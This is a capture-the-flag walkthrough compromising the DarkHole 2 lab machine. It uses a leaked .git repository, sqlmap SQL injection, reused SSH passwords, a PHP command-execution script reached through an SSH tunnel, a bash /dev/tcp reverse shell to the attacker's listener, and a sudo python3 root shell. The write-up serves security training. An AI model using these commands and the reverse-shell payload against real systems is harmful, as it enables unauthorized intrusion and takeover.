# DarkHole2
# Darkhole 2 – Full Compromise Walkthrough

This box starts with a leaked Git repository, moves through SQL injection and credential reuse, then finishes with a local-only PHP command runner and a misconfigured sudo rule. The chain is straightforward once each layer is peeled back.

---

## 1. Host Discovery

I located the target on the local subnet with `netdiscover`:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# sudo netdiscover -r 192.168.42.0/24
```

The target appeared at `192.168.42.145`.

---

## 2. Port Scanning

A version and default-script scan revealed two open ports:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# nmap -sV -A 192.168.42.145
Starting Nmap 7.94SVN
Nmap scan report for 192.168.42.145
Host is up (0.0058s latency).
Not shown: 998 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
|_http-title: DarkHole V2
| http-git:
|   192.168.42.145:80/.git/
|   Git repository found!
|   Last commit message: i changed login.php file for more secure

Service Info: OS: Linux
```

Two things stood out immediately:
- Apache was serving a web app called **DarkHole V2**.
- A `.git` directory was exposed on the web root.

---

## 3. Exposed Git Repository

I browsed to `http://192.168.42.145/.git/` and confirmed the repository was publicly readable. I pulled the entire `.git` folder locally:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# wget -r http://192.168.42.145/.git/
```

Inside the downloaded repository, I checked the commit history:

```bash
┌──(root@mursalin)-[~/Darkhole2/192.168.42.145/.git]
└─# git log
```

The log showed three commits. One commit message was especially interesting:

```
I added login.php file with default credentials
```

Looking at that commit confirmed the original `login.php` contained hardcoded credentials:

- **Email:** `lush@admin.com`
- **Password:** `321`

I used those credentials to log into the web application successfully.

---

## 4. SQL Injection in dashboard.php

Once authenticated, I captured a request to `dashboard.php?id=1` with Burp Suite and saved it to a file called `sql`.

I then ran SQLMap against the saved request:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# sqlmap -r sql --dbs --batch
```

SQLMap confirmed the `id` parameter was injectable and listed the available databases:

```
available databases [5]:
[*] darkhole_2
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

The `darkhole_2` database was the obvious target. I dumped its contents:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# sqlmap -r sql -D darkhole_2 --dump-all --batch
```

The dump exposed a `users` table with the following row:

| id | user  | pass |
|----|-------|------|
| 1  | jehad | fool |

These were valid SSH credentials.

---

## 5. SSH Access as jehad

I connected over SSH:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# ssh jehad@192.168.42.145
jehad@192.168.42.145's password: fool
```

I was now logged in as `jehad`. Basic enumeration showed no useful sudo rights and no obvious SUID binaries, so I moved on to running processes and services.

---

## 6. Local PHP Command Runner on Port 9999

Listing processes revealed something unusual:

```bash
jehad@darkhole:~$ ps aux | grep php
losy  1308  0.0  0.4 193692 21954 ?  S  08:08  0:00 php -S localhost:9999
```

A PHP built-in server was running as the user **losy** on `localhost:9999`.

I checked the web root:

```bash
jehad@darkhole:~$ ls -la /opt/web
total 12
drwxr-xr-x 2 root root 4096 Sep  3  2021 .
drwxr-xr-x 3 root root 4096 Sep  3  2021 ..
-rw-r--r-- 1 root root   95 Sep  3  2021 index.php
```

The file was world-readable, so I viewed its contents:

```bash
jehad@darkhole:~$ cat /opt/web/index.php
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
    echo system($_GET['cmd']);
}
?>
```

This script executes any command passed through the `cmd` GET parameter. Because the server only listens on `localhost`, I needed to tunnel to it.

---

## 7. SSH Tunnel and Reverse Shell as losy

From my attack machine, I forwarded local port `9999` to the target’s `127.0.0.1:9999`:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# ssh -L 9999:127.0.0.1:9999 jehad@192.168.42.145
```

With the tunnel active, I started a listener:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# nc -lvnp 3334
listening on [any] 3334 ...
```

Then I triggered a reverse shell through the PHP script:

```bash
┌──(root@mursalin)-[~/Darkhole2]
└─# curl "http://127.0.0.1:9999/?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.42.128/3334%200>%261'"
```

The listener caught a connection:

```
connect to [192.168.42.128] from (UNKNOWN) [192.168.42.145] 60228
bash: cannot set terminal process group (1305): Inappropriate ioctl for device
bash: no job control in this shell
losy@darkhole:/opt/web$
```

I now had a shell as `losy`.

---

## 8. Credential Discovery and sudo Misconfiguration

I checked the home directory and found a password in the Bash history:

```bash
losy@darkhole:~$ cat .bash_history
...
sudo -l -s
gang
```

The password for `losy` was `gang`.

Next, I checked sudo permissions:

```bash
losy@darkhole:~$ sudo -l -s
[sudo] password for losy: gang
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
```

`losy` could run `/usr/bin/python3` as root. That is enough to spawn a root shell.

---

## 9. Root Access

I used Python’s `os.system` to launch `/bin/bash`:

```bash
losy@darkhole:~$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@darkhole:~# whoami
root
```

Finally, I retrieved the root flag:

```bash
root@darkhole:~# cat /root/root.txt
Darkhole'Legend'
```

---

## Summary of the Chain

1. Exposed `.git` directory revealed old hardcoded login credentials.
2. SQL injection in `dashboard.php` dumped the `darkhole_2` database.
3. Credentials from the database allowed SSH access as `jehad`.
4. A local-only PHP command runner on port `9999` was reachable via SSH tunnel.
5. Command execution through the PHP script gave a shell as `losy`.
6. Bash history leaked the `losy` password.
7. `sudo` allowed `losy` to run `python3` as root, yielding a root shell.

---

*This walkthrough is for educational purposes only. Always ensure you have explicit authorization before testing any system.*

*Written by Mursalin*
